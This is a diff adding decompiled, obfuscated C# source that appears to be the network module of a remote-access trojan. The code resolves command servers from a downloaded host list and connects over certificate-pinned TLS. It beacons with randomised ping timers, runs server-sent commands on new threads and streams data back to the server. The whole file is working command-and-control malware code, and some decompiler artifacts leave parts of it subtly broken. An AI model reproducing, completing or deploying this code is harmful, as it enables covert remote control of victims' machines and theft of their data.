@@ -1,0 +1,702 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Security;
+using System.Net.Sockets;
+using System.Runtime.CompilerServices;
+using System.Security.Authentication;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading;
+
+// Token: 0x02000004 RID: 4
+public static class Network_Class
+{
+	// Token: 0x17000001 RID: 1
+	// (get) Token: 0x06000027 RID: 39 RVA: 0x0000214A File Offset: 0x0000034A
+	// (set) Token: 0x06000028 RID: 40 RVA: 0x00002151 File Offset: 0x00000351
+	public static Socket Socket_0 { get; set; }
+
+	// Token: 0x17000002 RID: 2
+	// (get) Token: 0x06000029 RID: 41 RVA: 0x00002159 File Offset: 0x00000359
+	// (set) Token: 0x0600002A RID: 42 RVA: 0x00002160 File Offset: 0x00000360
+	public static SslStream SslStream_0 { get; set; }
+
+	// Token: 0x17000003 RID: 3
+	// (get) Token: 0x0600002B RID: 43 RVA: 0x00002168 File Offset: 0x00000368
+	// (set) Token: 0x0600002C RID: 44 RVA: 0x0000216F File Offset: 0x0000036F
+	private static byte[] Byte_0 { get; set; }
+
+	// Token: 0x17000004 RID: 4
+	// (get) Token: 0x0600002D RID: 45 RVA: 0x00002177 File Offset: 0x00000377
+	// (set) Token: 0x0600002E RID: 46 RVA: 0x0000217E File Offset: 0x0000037E
+	private static long Int64_0 { get; set; }
+
+	// Token: 0x17000005 RID: 5
+	// (get) Token: 0x0600002F RID: 47 RVA: 0x00002186 File Offset: 0x00000386
+	// (set) Token: 0x06000030 RID: 48 RVA: 0x0000218D File Offset: 0x0000038D
+	private static long Int64_1 { get; set; }
+
+	// Token: 0x17000006 RID: 6
+	// (get) Token: 0x06000031 RID: 49 RVA: 0x00002195 File Offset: 0x00000395
+	// (set) Token: 0x06000032 RID: 50 RVA: 0x0000219C File Offset: 0x0000039C
+	private static Timer Timer_0 { get; set; }
+
+	// Token: 0x17000007 RID: 7
+	// (get) Token: 0x06000033 RID: 51 RVA: 0x000021A4 File Offset: 0x000003A4
+	// (set) Token: 0x06000034 RID: 52 RVA: 0x000021AB File Offset: 0x000003AB
+	public static bool Boolean_0 { get; set; }
+
+	// Token: 0x17000008 RID: 8
+	// (get) Token: 0x06000035 RID: 53 RVA: 0x000021B3 File Offset: 0x000003B3
+	private static object Object_0 { get; } = Network_Class.smethod_50();
+
+	// Token: 0x17000009 RID: 9
+	// (get) Token: 0x06000036 RID: 54 RVA: 0x000021BA File Offset: 0x000003BA
+	// (set) Token: 0x06000037 RID: 55 RVA: 0x000021C1 File Offset: 0x000003C1
+	private static Timer Timer_1 { get; set; }
+
+	// Token: 0x1700000A RID: 10
+	// (get) Token: 0x06000038 RID: 56 RVA: 0x000021C9 File Offset: 0x000003C9
+	// (set) Token: 0x06000039 RID: 57 RVA: 0x000021D0 File Offset: 0x000003D0
+	public static int Int32_0 { get; set; }
+
+	// Token: 0x1700000B RID: 11
+	// (get) Token: 0x0600003A RID: 58 RVA: 0x000021D8 File Offset: 0x000003D8
+	// (set) Token: 0x0600003B RID: 59 RVA: 0x000021DF File Offset: 0x000003DF
+	public static bool Boolean_1 { get; set; }
+
+	// Token: 0x0600003C RID: 60 RVA: 0x000030E8 File Offset: 0x000012E8
+	public static void smethod_0()
+	{
+		try
+		{
+			Network_Class.smethod_9(Network_Class.random_0, 0, 2);
+			Socket socket = Network_Class.smethod_10(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+			Network_Class.smethod_11(socket, 51200);
+			Network_Class.smethod_12(socket, 51200);
+			Network_Class.Socket_0 = socket;
+			string text = (Network_Class.smethod_13(GClass1.string_11, "null") ? Network_Class.smethod_1(GClass1.string_1) : null);
+			int num = (Network_Class.smethod_13(GClass1.string_11, "null") ? Network_Class.smethod_14(Network_Class.smethod_1(GClass1.string_0)) : 0);
+			if (Network_Class.smethod_15(GClass1.string_11, "null"))
+			{
+				WebClient webClient = Network_Class.webclient();
+				try
+				{
+					Network_Class.Socket_object(webClient, Network_Class.network_credential("", ""));
+					string[] array = Network_Class.smethod_20(Network_Class.smethod_19(webClient, GClass1.string_11), new string[] { ":" }, StringSplitOptions.None);
+					text = array[0];
+					num = Network_Class.smethod_14(array[Network_Class.smethod_9(Network_Class.random_0, 1, array.Length)]);
+				}
+				finally
+				{
+					if (webClient != null)
+					{
+						Network_Class.smethod_21(webClient);
+					}
+				}
+			}
+			Network_Class.smethod_2(text, num);
+			if (Network_Class.isConneted(Network_Class.Socket_0))
+			{
+				Network_Class.Boolean_0 = true;
+				Network_Class.SslStream_0 = Network_Class.smethod_24(Network_Class.smethod_23(Network_Class.Socket_0, true), false, new RemoteCertificateValidationCallback(Network_Class.smethod_3));
+				Network_Class.smethod_28(Network_Class.SslStream_0, Network_Class.smethod_27(Network_Class.smethod_26(Network_Class.smethod_25(Network_Class.Socket_0)), new char[] { ':' })[0], null, SslProtocols.Tls, false);
+				Network_Class.Int64_0 = 4L;
+				Network_Class.Byte_0 = new byte[Network_Class.Int64_0];
+				Network_Class.Int64_1 = 0L;
+				Network_Class.smethod_6(GClass6.smethod_0());
+				Network_Class.Int32_0 = 0;
+				Network_Class.Boolean_1 = false;
+				Network_Class.Timer_0 = Network_Class.smethod_29(new TimerCallback(Network_Class.smethod_7), null, Network_Class.smethod_9(Network_Class.random_0, 10000, 15000), Network_Class.smethod_9(Network_Class.random_0, 10000, 15000));
+				Network_Class.Timer_1 = Network_Class.smethod_29(new TimerCallback(Network_Class.smethod_8), null, 1, 1);
+				Network_Class.smethod_30(Network_Class.SslStream_0, Network_Class.Byte_0, (int)Network_Class.Int64_1, (int)Network_Class.Int64_0, new AsyncCallback(Network_Class.smethod_5), null);
+			}
+			else
+			{
+				Network_Class.Boolean_0 = false;
+			}
+		}
+		catch
+		{
+			Network_Class.Boolean_0 = false;
+		}
+	}
+
+	// Token: 0x0600003D RID: 61 RVA: 0x00003360 File Offset: 0x00001560
+	private static string smethod_1(string string_1)
+	{
+		string[] array = Network_Class.smethod_27(string_1, new char[] { ',' });
+		return array[Network_Class.smethod_9(Network_Class.random_0, 0, array.Length)];
+	}
+
+	// Token: 0x0600003E RID: 62 RVA: 0x00003394 File Offset: 0x00001594
+	private static void smethod_2(string string_1, int int_1)
+	{
+		if (Network_Class.smethod_31(string_1) != UriHostNameType.Unknown)
+		{
+			foreach (IPAddress ipaddress in Network_Class.smethod_32(string_1))
+			{
+				try
+				{
+					Network_Class.smethod_33(Network_Class.Socket_0, ipaddress, int_1);
+					if (Network_Class.isConneted(Network_Class.Socket_0))
+					{
+						return;
+					}
+				}
+				catch
+				{
+					Network_Class.smethod_34(25);
+				}
+			}
+			return;
+		}
+		Network_Class.smethod_35(Network_Class.Socket_0, string_1, int_1);
+	}
+
+	// Token: 0x0600003F RID: 63 RVA: 0x000021E7 File Offset: 0x000003E7
+	private static bool smethod_3(object object_1, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
+	{
+		return Network_Class.smethod_36(GClass1.x509Certificate2_0, x509Certificate_0);
+	}
+
+	// Token: 0x06000040 RID: 64 RVA: 0x0000340C File Offset: 0x0000160C
+	public static void smethod_4()
+	{
+		try
+		{
+			SslStream sslStream = Network_Class.SslStream_0;
+			if (sslStream == null)
+			{
+				goto IL_003B;
+			}
+			sslStream.method_0();
+			goto IL_0073;
+			IL_0012:
+			Timer timer = Network_Class.Timer_1;
+			int num;
+			if (timer != null)
+			{
+				timer.method_2();
+				num = 538879149;
+				goto IL_0050;
+			}
+			IL_001B:
+			Timer timer2 = Network_Class.Timer_0;
+			if (timer2 != null)
+			{
+				timer2.method_2();
+				num = 945964903;
+				goto IL_0050;
+			}
+			goto IL_007B;
+			IL_003B:
+			Socket socket = Network_Class.Socket_0;
+			if (socket == null)
+			{
+				goto IL_0012;
+			}
+			socket.method_1();
+			num = 554153660;
+			IL_0050:
+			switch ((num ^ 514431622) % 5)
+			{
+			case 0:
+				goto IL_001B;
+			case 1:
+				goto IL_003B;
+			case 3:
+				IL_0073:
+				num = 1923882991;
+				goto IL_0050;
+			case 4:
+				goto IL_0012;
+			}
+			IL_007B:;
+		}
+		catch
+		{
+		}
+		Network_Class.Boolean_0 = false;
+	}
+
+	// Token: 0x06000041 RID: 65 RVA: 0x000034B0 File Offset: 0x000016B0
+	public static void smethod_5(IAsyncResult iasyncResult_0)
+	{
+		try
+		{
+			if (Network_Class.isConneted(Network_Class.Socket_0) && Network_Class.Boolean_0)
+			{
+				int num = Network_Class.smethod_37(Network_Class.SslStream_0, iasyncResult_0);
+				if (num <= 0)
+				{
+					Network_Class.Boolean_0 = false;
+				}
+				else
+				{
+					Network_Class.Int64_1 += (long)num;
+					Network_Class.Int64_0 -= (long)num;
+					if (Network_Class.Int64_0 == 0L)
+					{
+						Network_Class.Int64_0 = (long)Network_Class.smethod_38(Network_Class.Byte_0, 0);
+						if (Network_Class.Int64_0 <= 0L)
+						{
+							Network_Class.Int64_0 = 4L;
+							Network_Class.Byte_0 = new byte[Network_Class.Int64_0];
+							Network_Class.Int64_1 = 0L;
+						}
+						else
+						{
+							Network_Class.Int64_1 = 0L;
+							Network_Class.Byte_0 = new byte[Network_Class.Int64_0];
+							while (Network_Class.Int64_0 > 0L)
+							{
+								int num2 = Network_Class.smethod_39(Network_Class.SslStream_0, Network_Class.Byte_0, (int)Network_Class.Int64_1, (int)Network_Class.Int64_0);
+								if (num2 <= 0)
+								{
+									Network_Class.Boolean_0 = false;
+									return;
+								}
+								Network_Class.Int64_1 += (long)num2;
+								Network_Class.Int64_0 -= (long)num2;
+							}
+							Network_Class.smethod_41(Network_Class.smethod_40(new ParameterizedThreadStart(GClass11.smethod_0)), Network_Class.Byte_0);
+							Network_Class.Int64_1 = 0L;
+							Network_Class.Int64_0 = 4L;
+							Network_Class.Byte_0 = new byte[Network_Class.Int64_0];
+						}
+					}
+					else if (Network_Class.Int64_0 < 0L)
+					{
+						Network_Class.Boolean_0 = false;
+						return;
+					}
+					Network_Class.smethod_30(Network_Class.SslStream_0, Network_Class.Byte_0, (int)Network_Class.Int64_1, (int)Network_Class.Int64_0, new AsyncCallback(Network_Class.smethod_5), null);
+				}
+			}
+			else
+			{
+				Network_Class.Boolean_0 = false;
+			}
+		}
+		catch
+		{
+			Network_Class.Boolean_0 = false;
+		}
+	}
+
+	// Token: 0x06000042 RID: 66 RVA: 0x00003698 File Offset: 0x00001898
+	public static void smethod_6(byte[] byte_1)
+	{
+		object obj = Network_Class.Object_0;
+		bool flag = false;
+		try
+		{
+			Network_Class.smethod_42(obj, ref flag);
+			try
+			{
+				if (Network_Class.Boolean_0)
+				{
+					byte[] array = Network_Class.smethod_43(byte_1.Length);
+					Network_Class.smethod_44(Network_Class.Socket_0, -1, SelectMode.SelectWrite);
+					Network_Class.smethod_45(Network_Class.SslStream_0, array, 0, array.Length);
+					if (byte_1.Length > 1000000)
+					{
+						MemoryStream memoryStream = Network_Class.smethod_46(byte_1);
+						try
+						{
+							byte[] array2 = new byte[50000];
+							int num;
+							while ((num = Network_Class.smethod_39(memoryStream, array2, 0, array2.Length)) > 0)
+							{
+								Network_Class.smethod_44(Network_Class.Socket_0, -1, SelectMode.SelectWrite);
+								Network_Class.smethod_45(Network_Class.SslStream_0, array2, 0, num);
+								Network_Class.smethod_47(Network_Class.SslStream_0);
+							}
+							goto IL_00CB;
+						}
+						finally
+						{
+							if (memoryStream != null)
+							{
+								Network_Class.smethod_21(memoryStream);
+							}
+						}
+					}
+					Network_Class.smethod_44(Network_Class.Socket_0, -1, SelectMode.SelectWrite);
+					Network_Class.smethod_45(Network_Class.SslStream_0, byte_1, 0, byte_1.Length);
+					Network_Class.smethod_47(Network_Class.SslStream_0);
+					IL_00CB:;
+				}
+			}
+			catch
+			{
+				Network_Class.Boolean_0 = false;
+			}
+		}
+		finally
+		{
+			if (flag)
+			{
+				Network_Class.smethod_48(obj);
+			}
+		}
+	}
+
+	// Token: 0x06000043 RID: 67 RVA: 0x000037B0 File Offset: 0x000019B0
+	public static void smethod_7(object object_1)
+	{
+		try
+		{
+			GClass17 gclass = new GClass17();
+			gclass.method_21("Packet").String_0 = "Ping";
+			Network_Class.smethod_6(gclass.method_31());
+			Network_Class.smethod_49();
+			Network_Class.Boolean_1 = true;
+		}
+		catch
+		{
+		}
+	}
+
+	// Token: 0x06000044 RID: 68 RVA: 0x00003804 File Offset: 0x00001A04
+	private static void smethod_8(object object_1)
+	{
+		try
+		{
+			if (Network_Class.Boolean_1 && Network_Class.Boolean_0)
+			{
+				Network_Class.Int32_0++;
+			}
+		}
+		catch
+		{
+		}
+	}
+
+	// Token: 0x06000046 RID: 70 RVA: 0x0000220A File Offset: 0x0000040A
+	static int smethod_9(Random random_1, int int_1, int int_2)
+	{
+		return random_1.Next(int_1, int_2);
+	}
+
+	// Token: 0x06000047 RID: 71 RVA: 0x00002214 File Offset: 0x00000414
+	static Socket smethod_10(AddressFamily addressFamily_0, SocketType socketType_0, ProtocolType protocolType_0)
+	{
+		return new Socket(addressFamily_0, socketType_0, protocolType_0);
+	}
+
+	// Token: 0x06000048 RID: 72 RVA: 0x0000221E File Offset: 0x0000041E
+	static void smethod_11(Socket socket_1, int int_1)
+	{
+		socket_1.ReceiveBufferSize = int_1;
+	}
+
+	// Token: 0x06000049 RID: 73 RVA: 0x00002227 File Offset: 0x00000427
+	static void smethod_12(Socket socket_1, int int_1)
+	{
+		socket_1.SendBufferSize = int_1;
+	}
+
+	// Token: 0x0600004A RID: 74 RVA: 0x00002230 File Offset: 0x00000430
+	static bool smethod_13(string string_1, string string_2)
+	{
+		return string_1 == string_2;
+	}
+
+	// Token: 0x0600004B RID: 75 RVA: 0x00002239 File Offset: 0x00000439
+	static int smethod_14(string string_1)
+	{
+		return Convert.ToInt32(string_1);
+	}
+
+	// Token: 0x0600004C RID: 76 RVA: 0x00002241 File Offset: 0x00000441
+	static bool smethod_15(string string_1, string string_2)
+	{
+		return string_1 != string_2;
+	}
+
+	// Token: 0x0600004D RID: 77 RVA: 0x0000224A File Offset: 0x0000044A
+	static WebClient webclient()
+	{
+		return new WebClient();
+	}
+
+	// Token: 0x0600004E RID: 78 RVA: 0x00002251 File Offset: 0x00000451
+	static NetworkCredential network_credential(string string_1, string string_2)
+	{
+		return new NetworkCredential(string_1, string_2);
+	}
+
+	// Token: 0x0600004F RID: 79 RVA: 0x0000225A File Offset: 0x0000045A
+	static void Socket_object(WebClient webClient_0, ICredentials icredentials_0)
+	{
+		webClient_0.Credentials = icredentials_0;
+	}
+
+	// Token: 0x06000050 RID: 80 RVA: 0x00002263 File Offset: 0x00000463
+	static string smethod_19(WebClient webClient_0, string string_1)
+	{
+		return webClient_0.DownloadString(string_1);
+	}
+
+	// Token: 0x06000051 RID: 81 RVA: 0x0000226C File Offset: 0x0000046C
+	static string[] smethod_20(string string_1, string[] string_2, StringSplitOptions stringSplitOptions_0)
+	{
+		return string_1.Split(string_2, stringSplitOptions_0);
+	}
+
+	// Token: 0x06000052 RID: 82 RVA: 0x00002276 File Offset: 0x00000476
+	static void smethod_21(IDisposable idisposable_0)
+	{
+		idisposable_0.Dispose();
+	}
+
+	// Token: 0x06000053 RID: 83 RVA: 0x0000227E File Offset: 0x0000047E
+	static bool isConneted(Socket socket_1)
+	{
+		return socket_1.Connected;
+	}
+
+	// Token: 0x06000054 RID: 84 RVA: 0x00002286 File Offset: 0x00000486
+	static NetworkStream smethod_23(Socket socket_1, bool bool_2)
+	{
+		return new NetworkStream(socket_1, bool_2);
+	}
+
+	// Token: 0x06000055 RID: 85 RVA: 0x0000228F File Offset: 0x0000048F
+	static SslStream smethod_24(Stream stream_0, bool bool_2, RemoteCertificateValidationCallback remoteCertificateValidationCallback_0)
+	{
+		return new SslStream(stream_0, bool_2, remoteCertificateValidationCallback_0);
+	}
+
+	// Token: 0x06000056 RID: 86 RVA: 0x00002299 File Offset: 0x00000499
+	static EndPoint smethod_25(Socket socket_1)
+	{
+		return socket_1.RemoteEndPoint;
+	}
+
+	// Token: 0x06000057 RID: 87 RVA: 0x000022A1 File Offset: 0x000004A1
+	static string smethod_26(object object_1)
+	{
+		return object_1.ToString();
+	}
+
+	// Token: 0x06000058 RID: 88 RVA: 0x000022A9 File Offset: 0x000004A9
+	static string[] smethod_27(string string_1, char[] char_0)
+	{
+		return string_1.Split(char_0);
+	}
+
+	// Token: 0x06000059 RID: 89 RVA: 0x000022B2 File Offset: 0x000004B2
+	static void smethod_28(SslStream sslStream_1, string string_1, X509CertificateCollection x509CertificateCollection_0, SslProtocols sslProtocols_0, bool bool_2)
+	{
+		sslStream_1.AuthenticateAsClient(string_1, x509CertificateCollection_0, sslProtocols_0, bool_2);
+	}
+
+	// Token: 0x0600005A RID: 90 RVA: 0x000022BF File Offset: 0x000004BF
+	static Timer smethod_29(TimerCallback timerCallback_0, object object_1, int int_1, int int_2)
+	{
+		return new Timer(timerCallback_0, object_1, int_1, int_2);
+	}
+
+	// Token: 0x0600005B RID: 91 RVA: 0x000022CA File Offset: 0x000004CA
+	static IAsyncResult smethod_30(Stream stream_0, byte[] byte_1, int int_1, int int_2, AsyncCallback asyncCallback_0, object object_1)
+	{
+		return stream_0.BeginRead(byte_1, int_1, int_2, asyncCallback_0, object_1);
+	}
+
+	// Token: 0x0600005C RID: 92 RVA: 0x000022D9 File Offset: 0x000004D9
+	static UriHostNameType smethod_31(string string_1)
+	{
+		return Uri.CheckHostName(string_1);
+	}
+
+	// Token: 0x0600005D RID: 93 RVA: 0x000022E1 File Offset: 0x000004E1
+	static IPAddress[] smethod_32(string string_1)
+	{
+		return Dns.GetHostAddresses(string_1);
+	}
+
+	// Token: 0x0600005E RID: 94 RVA: 0x000022E9 File Offset: 0x000004E9
+	static void smethod_33(Socket socket_1, IPAddress ipaddress_0, int int_1)
+	{
+		socket_1.Connect(ipaddress_0, int_1);
+	}
+
+	// Token: 0x0600005F RID: 95 RVA: 0x000020D8 File Offset: 0x000002D8
+	static void smethod_34(int int_1)
+	{
+		Thread.Sleep(int_1);
+	}
+
+	// Token: 0x06000060 RID: 96 RVA: 0x000022F3 File Offset: 0x000004F3
+	static void smethod_35(Socket socket_1, string string_1, int int_1)
+	{
+		socket_1.Connect(string_1, int_1);
+	}
+
+	// Token: 0x06000061 RID: 97 RVA: 0x000022FD File Offset: 0x000004FD
+	static bool smethod_36(X509Certificate x509Certificate_0, X509Certificate x509Certificate_1)
+	{
+		return x509Certificate_0.Equals(x509Certificate_1);
+	}
+
+	// Token: 0x06000062 RID: 98 RVA: 0x00002306 File Offset: 0x00000506
+	void method_0()
+	{
+		base.Dispose();
+	}
+
+	// Token: 0x06000063 RID: 99 RVA: 0x0000230E File Offset: 0x0000050E
+	void method_1()
+	{
+		base.Dispose();
+	}
+
+	// Token: 0x06000064 RID: 100 RVA: 0x00002316 File Offset: 0x00000516
+	void method_2()
+	{
+		base.Dispose();
+	}
+
+	// Token: 0x06000065 RID: 101 RVA: 0x0000231E File Offset: 0x0000051E
+	static int smethod_37(Stream stream_0, IAsyncResult iasyncResult_0)
+	{
+		return stream_0.EndRead(iasyncResult_0);
+	}
+
+	// Token: 0x06000066 RID: 102 RVA: 0x00002327 File Offset: 0x00000527
+	static int smethod_38(byte[] byte_1, int int_1)
+	{
+		return BitConverter.ToInt32(byte_1, int_1);
+	}
+
+	// Token: 0x06000067 RID: 103 RVA: 0x00002330 File Offset: 0x00000530
+	static int smethod_39(Stream stream_0, byte[] byte_1, int int_1, int int_2)
+	{
+		return stream_0.Read(byte_1, int_1, int_2);
+	}
+
+	// Token: 0x06000068 RID: 104 RVA: 0x000020B7 File Offset: 0x000002B7
+	static Thread smethod_40(ParameterizedThreadStart parameterizedThreadStart_0)
+	{
+		return new Thread(parameterizedThreadStart_0);
+	}
+
+	// Token: 0x06000069 RID: 105 RVA: 0x0000233B File Offset: 0x0000053B
+	static void smethod_41(Thread thread_0, object object_1)
+	{
+		thread_0.Start(object_1);
+	}
+
+	// Token: 0x0600006A RID: 106 RVA: 0x00002344 File Offset: 0x00000544
+	static void smethod_42(object object_1, ref bool bool_2)
+	{
+		Monitor.Enter(object_1, ref bool_2);
+	}
+
+	// Token: 0x0600006B RID: 107 RVA: 0x0000234D File Offset: 0x0000054D
+	static byte[] smethod_43(int int_1)
+	{
+		return BitConverter.GetBytes(int_1);
+	}
+
+	// Token: 0x0600006C RID: 108 RVA: 0x00002355 File Offset: 0x00000555
+	static bool smethod_44(Socket socket_1, int int_1, SelectMode selectMode_0)
+	{
+		return socket_1.Poll(int_1, selectMode_0);
+	}
+
+	// Token: 0x0600006D RID: 109 RVA: 0x0000235F File Offset: 0x0000055F
+	static void smethod_45(Stream stream_0, byte[] byte_1, int int_1, int int_2)
+	{
+		stream_0.Write(byte_1, int_1, int_2);
+	}
+
+	// Token: 0x0600006E RID: 110 RVA: 0x0000236A File Offset: 0x0000056A
+	static MemoryStream smethod_46(byte[] byte_1)
+	{
+		return new MemoryStream(byte_1);
+	}
+
+	// Token: 0x0600006F RID: 111 RVA: 0x00002372 File Offset: 0x00000572
+	static void smethod_47(Stream stream_0)
+	{
+		stream_0.Flush();
+	}
+
+	// Token: 0x06000070 RID: 112 RVA: 0x0000237A File Offset: 0x0000057A
+	static void smethod_48(object object_1)
+	{
+		Monitor.Exit(object_1);
+	}
+
+	// Token: 0x06000071 RID: 113 RVA: 0x00002382 File Offset: 0x00000582
+	static void smethod_49()
+	{
+		GC.Collect();
+	}
+
+	// Token: 0x06000072 RID: 114 RVA: 0x00002389 File Offset: 0x00000589
+	static object smethod_50()
+	{
+		return new object();
+	}
+
+	// Token: 0x06000073 RID: 115 RVA: 0x00002390 File Offset: 0x00000590
+	static Random smethod_51()
+	{
+		return new Random();
+	}
+
+	// Token: 0x04000015 RID: 21
+	[CompilerGenerated]
+	private static Socket socket_0;
+
+	// Token: 0x04000016 RID: 22
+	[CompilerGenerated]
+	private static SslStream sslStream_0;
+
+	// Token: 0x04000017 RID: 23
+	[CompilerGenerated]
+	private static byte[] byte_0;
+
+	// Token: 0x04000018 RID: 24
+	[CompilerGenerated]
+	private static long long_0;
+
+	// Token: 0x04000019 RID: 25
+	[CompilerGenerated]
+	private static long long_1;
+
+	// Token: 0x0400001A RID: 26
+	[CompilerGenerated]
+	private static Timer timer_0;
+
+	// Token: 0x0400001B RID: 27
+	[CompilerGenerated]
+	private static bool bool_0;
+
+	// Token: 0x0400001C RID: 28
+	[CompilerGenerated]
+	private static readonly object object_0;
+
+	// Token: 0x0400001D RID: 29
+	[CompilerGenerated]
+	private static Timer timer_1;
+
+	// Token: 0x0400001E RID: 30
+	[CompilerGenerated]
+	private static int int_0;
+
+	// Token: 0x0400001F RID: 31
+	[CompilerGenerated]
+	private static bool bool_1;
+
+	// Token: 0x04000020 RID: 32
+	private static Random random_0 = Network_Class.smethod_51();
+
+	// Token: 0x04000021 RID: 33
+	public static string string_0;
+}
